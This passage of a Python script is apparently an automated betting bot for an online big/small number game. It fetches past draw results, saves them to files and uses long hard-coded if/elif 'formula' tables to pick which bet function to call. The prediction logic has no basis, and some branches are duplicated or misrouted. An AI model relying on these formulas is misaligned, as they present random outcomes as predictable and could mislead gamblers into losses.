      elif res == '9':
       auto_kecilX1()
      elif res == '10':
       auto_kecilX1()
      elif res == '11':
       auto_besarX1()
      elif res == '12':
       auto_besarX1()
      elif res == '13':
       auto_kecilX1()
      elif res == '14':
       auto_kecilX1()
      elif res == '15':
       auto_besarX1()
      elif res == '16':
       auto_besarX1()
      elif res == '17':
       auto_besarX1()
      elif res == '18':
       auto_besarX1()
      elif res == '19':
       auto_besarX1()
      elif res == '20':
       auto_kecilX1()
      elif res == '21':
       auto_kecilX1()
      elif res == '22':
       auto_kecilX1()
      elif res == '23':
       auto_kecilX1()
      elif res == '24':
       auto_kecilX1()
      elif res == '25':
       auto_besarX1()
      elif res == '26':
       auto_besarX1()
      elif res == '27':
       auto_besarX1()
      elif res == '28':
       auto_besarX1()
      elif res == '29':
       auto_besarX1()
      elif res == '30':
       auto_kecilX1()
      elif res == '31':
       auto_kecilX1()
      elif res == '32':
       auto_kecilX1()
      elif res == '33':
       auto_kecilX1()
      elif res == '34':
       auto_kecilX1()
      elif res == '35':
       auto_besarX1()
      elif res == '36':
       auto_besarX1()
      elif res == '37':
       auto_besarX1()
      elif res == '38':
       auto_besarX1()
      elif res == '39':
       auto_besarX1()
      else:
       auto_besarX1()
			
def rumusX2 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_besarX2()
      elif res == '1':
       auto_besarX2()
      elif res == '2':
       auto_besarX2()
      elif res == '3':
       auto_besarX2()
      elif res == '4':
       auto_besarX2()
      elif res == '5':
       auto_besarX2()
      elif res == '6':
       auto_besarX2()
      elif res == '7':
       auto_besarX2()
      elif res == '8':
       auto_besarX2()
      elif res == '9':
       auto_besarX2()
      elif res == '10':
       auto_besarX2()
      elif res == '11':
       auto_besarX2()
      elif res == '12':
       auto_besarX2()
      elif res == '13':
       auto_besarX2()
      elif res == '14':
       auto_besarX2()
      elif res == '15':
       auto_besarX2()
      elif res == '16':
       auto_besarX2()
      elif res == '17':
       auto_besarX2()
      elif res == '18':
       auto_besarX2()
      elif res == '19':
       auto_besarX2()
      elif res == '20':
       auto_kecilX2()
      elif res == '21':
       auto_kecilX2()
      elif res == '22':
       auto_kecilX2()
      elif res == '23':
       auto_kecilX2()
      elif res == '24':
       auto_kecilX2()
      elif res == '25':
       auto_besarX2()
      elif res == '26':
       auto_besarX2()
      elif res == '27':
       auto_besarX2()
      elif res == '28':
       auto_besarX2()
      elif res == '29':
       auto_besarX2()
      elif res == '30':
       auto_kecilX2()
      elif res == '31':
       auto_kecilX2()
      elif res == '32':
       auto_kecilX2()
      elif res == '33':
       auto_kecilX2()
      elif res == '34':
       auto_kecilX2()
      elif res == '35':
       auto_besarX2()
      elif res == '36':
       auto_besarX2()
      elif res == '37':
       auto_besarX2()
      elif res == '38':
       auto_besarX2()
      elif res == '39':
       auto_besarX2()
      else:
       auto_besarX2()

def rumusX3 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX3()
      elif res == '1':
       auto_kecilX3()
      elif res == '2':
       auto_kecilX3()
      elif res == '3':
       auto_kecilX3()
      elif res == '4':
       auto_kecilX3()
      elif res == '5':
       auto_besarX3()
      elif res == '6':
       auto_besarX3()
      elif res == '7':
       auto_besarX3()
      elif res == '8':
       auto_besarX3()
      elif res == '9':
       auto_besarX3()
      elif res == '10':
       auto_kecilX3()
      elif res == '11':
       auto_kecilX3()
      elif res == '12':
       auto_kecilX3()
      elif res == '13':
       auto_kecilX3()
      elif res == '14':
       auto_kecilX3()
      elif res == '15':
       auto_besarX3()
      elif res == '16':
       auto_besarX3()
      elif res == '17':
       auto_besarX3()
      elif res == '18':
       auto_besarX3()
      elif res == '19':
       auto_besarX3()
      elif res == '20':
       auto_kecilX3()
      elif res == '21':
       auto_kecilX3()
      elif res == '22':
       auto_kecilX3()
      elif res == '23':
       auto_kecilX3()
      elif res == '24':
       auto_kecilX3()
      elif res == '25':
       auto_besarX3()
      elif res == '26':
       auto_besarX3()
      elif res == '27':
       auto_besarX3()
      elif res == '28':
       auto_besarX3()
      elif res == '29':
       auto_besarX3()
      elif res == '30':
       auto_kecilX3()
      elif res == '31':
       auto_kecilX3()
      elif res == '32':
       auto_kecilX3()
      elif res == '33':
       auto_kecilX3()
      elif res == '34':
       auto_kecilX3()
      elif res == '35':
       auto_besarX3()
      elif res == '36':
       auto_besarX3()
      elif res == '37':
       auto_besarX3()
      elif res == '38':
       auto_besarX3()
      elif res == '39':
       auto_besarX3()
      else:
       auto_kecilX3()
       
    
				
def rumusX4 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_besarX4()
      elif res == '1':
       auto_besarX4()
      elif res == '2':
       auto_besarX4()
      elif res == '3':
       auto_besarX4()
      elif res == '4':
       auto_besarX4()
      elif res == '5':
       auto_kecilX4()
      elif res == '6':
       auto_kecilX4()
      elif res == '7':
       auto_kecilX4()
      elif res == '8':
       auto_kecilX4()
      elif res == '9':
       auto_kecilX4()
      elif res == '10':
       auto_besarX4()
      elif res == '11':
       auto_besarX4()
      elif res == '12':
       auto_besarX4()
      elif res == '13':
       auto_besarX4()
      elif res == '14':
       auto_besarX4()
      elif res == '15':
       auto_besarX4()
      elif res == '16':
       auto_besarX4()
      elif res == '17':
       auto_besarX4()
      elif res == '18':
       auto_besarX4()
      elif res == '19':
       auto_besarX4()
      elif res == '20':
       auto_kecilX4()
      elif res == '21':
       auto_kecilX4()
      elif res == '22':
       auto_kecilX4()
      elif res == '23':
       auto_kecilX4()
      elif res == '24':
       auto_kecilX4()
      elif res == '25':
       auto_besarX4()
      elif res == '26':
       auto_besarX4()
      elif res == '27':
       auto_besarX4()
      elif res == '28':
       auto_besarX4()
      elif res == '29':
       auto_besarX4()
      elif res == '30':
       auto_kecilX4()
      elif res == '31':
       auto_kecilX4()
      elif res == '34':
       auto_kecilX4()
      elif res == '33':
       auto_kecilX4()
      elif res == '34':
       auto_kecilX4()
      elif res == '35':
       auto_besarX4()
      elif res == '36':
       auto_besarX4()
      elif res == '37':
       auto_besarX4()
      elif res == '38':
       auto_besarX4()
      elif res == '39':
       auto_besarX4()
      else:
       auto_besarX4()
       
       
def rumusX5 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       rumusX6()
      elif res == '1':
       rumusX7()
      elif res == '2':
       rumusX8()
      elif res == '3':
       rumusX9()
      elif res == '4':
       rumusX2()
      elif res == '5':
       rumusX3()
      elif res == '6':
       rumusX4()
      elif res == '7':
       rumusX6()
      elif res == '8':
       rumusX7()
      elif res == '9':
       rumusX8()
      elif res == '10':
       auto_kecilX5()
      elif res == '11':
       auto_kecilX5()
      elif res == '12':
       auto_kecilX5()
      elif res == '13':
       auto_kecilX5()
      elif res == '14':
       auto_kecilX5()
      elif res == '15':
       auto_besarX5()
      elif res == '16':
       auto_besarX5()
      elif res == '17':
       auto_besarX5()
      elif res == '18':
       auto_besarX5()
      elif res == '19':
       auto_besarX5()
      elif res == '20':
       auto_kecilX5()
      elif res == '21':
       auto_kecilX5()
      elif res == '22':
       auto_kecilX5()
      elif res == '23':
       auto_kecilX5()
      elif res == '24':
       auto_kecilX5()
      elif res == '25':
       auto_besarX5()
      elif res == '26':
       auto_besarX5()
      elif res == '27':
       auto_besarX5()
      elif res == '28':
       auto_besarX5()
      elif res == '29':
       auto_besarX5()
      elif res == '30':
       auto_kecilX5()
      elif res == '31':
       auto_kecilX5()
      elif res == '32':
       auto_kecilX5()
      elif res == '33':
       auto_kecilX5()
      elif res == '34':
       auto_kecilX5()
      elif res == '35':
       auto_besarX5()
      elif res == '36':
       auto_besarX5()
      elif res == '37':
       auto_besarX5()
      elif res == '38':
       auto_besarX5()
      elif res == '39':
       auto_besarX5()
      else:
       auto_kecilX5()
       
       
def rumusX6 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_besarX6()
      elif res == '1':
       auto_besarX6()
      elif res == '2':
       auto_besarX6()
      elif res == '3':
       auto_besarX6()
      elif res == '4':
       auto_besarX6()
      elif res == '5':
       auto_kecilX6()
      elif res == '6':
       auto_kecilX6()
      elif res == '7':
       auto_kecilX6()
      elif res == '8':
       auto_kecilX6()
      elif res == '9':
       auto_kecilX6()
      elif res == '10':
       auto_besarX6()
      elif res == '11':
       auto_besarX6()
      elif res == '12':
       auto_besarX6()
      elif res == '13':
       auto_besarX6()
      elif res == '14':
       auto_besarX6()
      elif res == '15':
       auto_kecilX6()
      elif res == '16':
       auto_kecilX6()
      elif res == '17':
       auto_kecilX6()
      elif res == '18':
       auto_besarX6()
      elif res == '19':
       auto_besarX6()
      elif res == '20':
       auto_kecilX6()
      elif res == '21':
       auto_kecilX6()
      elif res == '22':
       auto_kecilX6()
      elif res == '23':
       auto_kecilX6()
      elif res == '24':
       auto_kecilX6()
      elif res == '25':
       auto_besarX6()
      elif res == '26':
       auto_besarX6()
      elif res == '27':
       auto_besarX6()
      elif res == '28':
       auto_besarX6()
      elif res == '29':
       auto_besarX6()
      elif res == '30':
       auto_kecilX2()
      elif res == '31':
       auto_kecilX6()
      elif res == '32':
       auto_kecilX6()
      elif res == '33':
       auto_kecilX6()
      elif res == '34':
       auto_kecilX6()
      elif res == '35':
       auto_besarX6()
      elif res == '36':
       auto_besarX6()
      elif res == '37':
       auto_besarX6()
      elif res == '38':
       auto_besarX6()
      elif res == '39':
       auto_besarX6()
      else:
       auto_kecilX6()
       
       
def rumusX7 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX7()
      elif res == '1':
       auto_besarX7()
      elif res == '2':
       auto_kecilX7()
      elif res == '3':
       auto_besarX7()
      elif res == '4':
       auto_kecilX7()
      elif res == '5':
       auto_besarX7()
      elif res == '6':
       auto_kecilX7()
      elif res == '7':
       auto_besarX7()
      elif res == '8':
       auto_besarX7()
      elif res == '9':
       auto_kecilX7()
      elif res == '10':
       auto_kecilX7()
      elif res == '11':
       auto_kecilX7()
      elif res == '12':
       auto_besarX7()
      elif res == '13':
       auto_kecilX7()
      elif res == '14':
       auto_kecilX7()
      elif res == '15':
       auto_besarX7()
      elif res == '16':
       auto_besarX7()
      elif res == '17':
       auto_besarX7()
      elif res == '18':
       auto_kecilX7()
      elif res == '19':
       auto_besarX7()
      elif res == '20':
       auto_kecilX7()
      elif res == '21':
       auto_kecilX7()
      elif res == '22':
       auto_kecilX7()
      elif res == '23':
       auto_kecilX7()
      elif res == '24':
       auto_kecilX7()
      elif res == '25':
       auto_besarX7()
      elif res == '26':
       auto_besarX7()
      elif res == '27':
       auto_besarX7()
      elif res == '28':
       auto_besarX7()
      elif res == '29':
       auto_besarX7()
      elif res == '30':
       auto_kecilX7()
      elif res == '31':
       auto_kecilX7()
      elif res == '32':
       auto_kecilX7()
      elif res == '33':
       auto_kecilX7()
      elif res == '34':
       auto_kecilX2()
      elif res == '35':
       auto_besarX7()
      elif res == '36':
       auto_besarX7()
      elif res == '37':
       auto_besarX7()
      elif res == '38':
       auto_besarX7()
      elif res == '39':
       auto_besarX7()
      else:
       auto_kecilX7()

def rumusX8 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX8()
      elif res == '1':
       auto_kecilX8()
      elif res == '2':
       auto_kecilX8()
      elif res == '3':
       auto_kecilX8()
      elif res == '4':
       auto_kecilX8()
      elif res == '5':
       auto_besarX8()
      elif res == '6':
       auto_besarX8()
      elif res == '7':
       auto_besarX8()
      elif res == '8':
       auto_besarX8()
      elif res == '9':
       auto_besarX8()
      elif res == '10':
       auto_kecilX8()
      elif res == '11':
       auto_kecilX8()
      elif res == '12':
       auto_kecilX8()
      elif res == '13':
       auto_kecilX8()
      elif res == '14':
       auto_kecilX8()
      elif res == '15':
       auto_besarX8()
      elif res == '16':
       auto_besarX8()
      elif res == '17':
       auto_besarX8()
      elif res == '18':
       auto_besarX8()
      elif res == '19':
       auto_besarX8()
      elif res == '20':
       auto_kecilX8()
      elif res == '21':
       auto_kecilX8()
      elif res == '22':
       auto_kecilX8()
      elif res == '23':
       auto_kecilX8()
      elif res == '24':
       auto_kecilX8()
      elif res == '25':
       auto_besarX8()
      elif res == '26':
       auto_besarX8()
      elif res == '27':
       auto_besarX8()
      elif res == '28':
       auto_besarX8()
      elif res == '29':
       auto_besarX8()
      elif res == '30':
       auto_kecilX8()
      elif res == '31':
       auto_kecilX8()
      elif res == '32':
       auto_kecilX8()
      elif res == '33':
       auto_kecilX8()
      elif res == '34':
       auto_kecilX8()
      elif res == '35':
       auto_besarX8()
      elif res == '36':
       auto_besarX8()
      elif res == '37':
       auto_besarX8()
      elif res == '38':
       auto_besarX8()
      elif res == '39':
       auto_besarX8()
      else:
       auto_kecilX8()
       
       
def rumusX9 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX9()
      elif res == '1':
       auto_kecilX9()
      elif res == '2':
       auto_kecilX9()
      elif res == '3':
       auto_kecilX9()
      elif res == '4':
       auto_kecilX9()
      elif res == '5':
       auto_besarX9()
      elif res == '6':
       auto_besarX9()
      elif res == '7':
       auto_besarX9()
      elif res == '8':
       auto_besarX9()
      elif res == '9':
       auto_besarX9()
      elif res == '10':
       auto_kecilX9()
      elif res == '11':
       auto_kecilX9()
      elif res == '12':
       auto_kecilX9()
      elif res == '13':
       auto_kecilX9()
      elif res == '14':
       auto_kecilX9()
      elif res == '15':
       auto_besarX9()
      elif res == '16':
       auto_besarX9()
      elif res == '17':
       auto_besarX9()
      elif res == '18':
       auto_besarX9()
      elif res == '19':
       auto_besarX9()
      elif res == '20':
       auto_kecilX9()
      elif res == '21':
       auto_kecilX9()
      elif res == '22':
       auto_kecilX9()
      elif res == '23':
       auto_kecilX9()
      elif res == '24':
       auto_kecilX9()
      elif res == '25':
       auto_besarX9()
      elif res == '26':
       auto_besarX9()
      elif res == '27':
       auto_besarX9()
      elif res == '28':
       auto_besarX9()
      elif res == '29':
       auto_besarX9()
      elif res == '30':
       auto_kecilX9()
      elif res == '31':
       auto_kecilX9()
      elif res == '32':
       auto_kecilX9()
      elif res == '33':
       auto_kecilX9()
      elif res == '34':
       auto_kecilX9()
      elif res == '35':
       auto_besarX9()
      elif res == '36':
       auto_besarX9()
      elif res == '37':
       auto_besarX9()
      elif res == '38':
       auto_besarX9()
      elif res == '39':
       auto_besarX9()
      else:
       auto_kecilX9()
       
       
def rumusX10 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX10()
      elif res == '1':
       auto_kecilX10()
      elif res == '2':
       auto_kecilX10()
      elif res == '3':
       auto_kecilX10()
      elif res == '4':
       auto_kecilX10()
      elif res == '5':
       auto_besarX10()
      elif res == '6':
       auto_besarX10()
      elif res == '7':
       auto_besarX10()
      elif res == '8':
       auto_besarX10()
      elif res == '9':
       auto_besarX10()
      elif res == '10':
       auto_kecilX10()
      elif res == '11':
       auto_kecilX10()
      elif res == '12':
       auto_kecilX10()
      elif res == '13':
       auto_kecilX10()
      elif res == '14':
       auto_kecilX10()
      elif res == '15':
       auto_besarX10()
      elif res == '16':
       auto_besarX10()
      elif res == '17':
       auto_besarX10()
      elif res == '18':
       auto_besarX10()
      elif res == '19':
       auto_besarX10()
      elif res == '20':
       auto_kecilX10()
      elif res == '21':
       auto_kecilX10()
      elif res == '22':
       auto_kecilX10()
      elif res == '23':
       auto_kecilX10()
      elif res == '24':
       auto_kecilX10()
      elif res == '25':
       auto_besarX10()
      elif res == '26':
       auto_besarX10()
      elif res == '27':
       auto_besarX10()
      elif res == '28':
       auto_besarX10()
      elif res == '29':
       auto_besarX10()
      elif res == '30':
       auto_kecilX10()
      elif res == '31':
       auto_kecilX10()
      elif res == '32':
       auto_kecilX10()
      elif res == '33':
       auto_kecilX10()
      elif res == '34':
       auto_kecilX10()
      elif res == '35':
       auto_besarX10()
      elif res == '36':
       auto_besarX10()
      elif res == '37':
       auto_besarX10()
      elif res == '38':
       auto_besarX10()
      else:
       auto_kecilX10()
       
       
def rumusX11 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX11()
      elif res == '1':
       auto_kecilX11()
      elif res == '2':
       auto_kecilX11()
      elif res == '3':
       auto_kecilX11()
      elif res == '4':
       auto_kecilX11()
      elif res == '5':
       auto_besarX11()
      elif res == '6':
       auto_besarX11()
      elif res == '7':
       auto_besarX11()
      elif res == '8':
       auto_besarX11()
      elif res == '9':
       auto_besarX11()
      elif res == '10':
       auto_kecilX11()
      elif res == '11':
       auto_kecilX11()
      elif res == '12':
       auto_kecilX11()
      elif res == '13':
       auto_kecilX11()
      elif res == '14':
       auto_kecilX11()
      elif res == '15':
       auto_besarX11()
      elif res == '16':
       auto_besarX11()
      elif res == '17':
       auto_besarX11()
      elif res == '18':
       auto_besarX11()
      elif res == '19':
       auto_besarX11()
      elif res == '20':
       auto_kecilX11()
      elif res == '21':
       auto_kecilX11()
      elif res == '22':
       auto_kecilX11()
      elif res == '23':
       auto_kecilX11()
      elif res == '24':
       auto_kecilX11()
      elif res == '25':
       auto_besarX11()
      elif res == '26':
       auto_besarX11()
      elif res == '27':
       auto_besarX11()
      elif res == '28':
       auto_besarX11()
      elif res == '29':
       auto_besarX11()
      elif res == '30':
       auto_kecilX11()
      elif res == '31':
       auto_kecilX11()
      elif res == '32':
       auto_kecilX11()
      elif res == '33':
       auto_kecilX11()
      elif res == '34':
       auto_kecilX11()
      elif res == '35':
       auto_besarX11()
      elif res == '36':
       auto_besarX11()
      elif res == '37':
       auto_besarX11()
      elif res == '38':
       auto_besarX11()
      elif res == '39':
       auto_besarX11()
      else:
       auto_besarX11()
       
       
def rumusX12 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX12()
      elif res == '1':
       auto_kecilX12()
      elif res == '2':
       auto_kecilX12()
      elif res == '3':
       auto_kecilX12()
      elif res == '4':
       auto_kecilX12()
      elif res == '5':
       auto_besarX12()
      elif res == '6':
       auto_besarX12()
      elif res == '7':
       auto_besarX12()
      elif res == '8':
       auto_besarX12()
      elif res == '9':
       auto_besarX12()
      elif res == '10':
       auto_kecilX12()
      elif res == '11':
       auto_kecilX12()
      elif res == '12':
       auto_kecilX12()
      elif res == '13':
       auto_kecilX12()
      elif res == '14':
       auto_kecilX12()
      elif res == '15':
       auto_besarX12()
      elif res == '16':
       auto_besarX12()
      elif res == '17':
       auto_besarX12()
      elif res == '18':
       auto_besarX12()
      elif res == '19':
       auto_besarX12()
      elif res == '20':
       auto_besarX12()
      elif res == '21':
       auto_besarX12()
      elif res == '22':
       auto_besarX12()
      elif res == '23':
       auto_besarX12()
      elif res == '24':
       auto_besarX12()
      elif res == '25':
       auto_kecilX12()
      elif res == '26':
       auto_kecilX12()
      elif res == '27':
       auto_kecilX12()
      elif res == '28':
       auto_kecilX12()
      elif res == '29':
       auto_kecilX12()
      elif res == '30':
       auto_besarX12()
      elif res == '31':
       auto_besarX12()
      elif res == '32':
       auto_besarX12()
      elif res == '33':
       auto_besarX12()
      elif res == '34':
       auto_besarX12()
      elif res == '35':
       auto_kecilX12()
      elif res == '36':
       auto_kecilX12()
      elif res == '37':
       auto_kecilX12()
      elif res == '38':
       auto_kecilX12()
      elif res == '39':
       auto_kecilX12()
      else:
       auto_besarX12()
       
       
def rumusX13 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX13()
      elif res == '1':
       auto_kecilX13()
      elif res == '2':
       auto_kecilX13()
      elif res == '3':
       auto_kecilX13()
      elif res == '4':
       auto_kecilX13()
      elif res == '5':
       auto_besarX13()
      elif res == '6':
       auto_besarX13()
      elif res == '7':
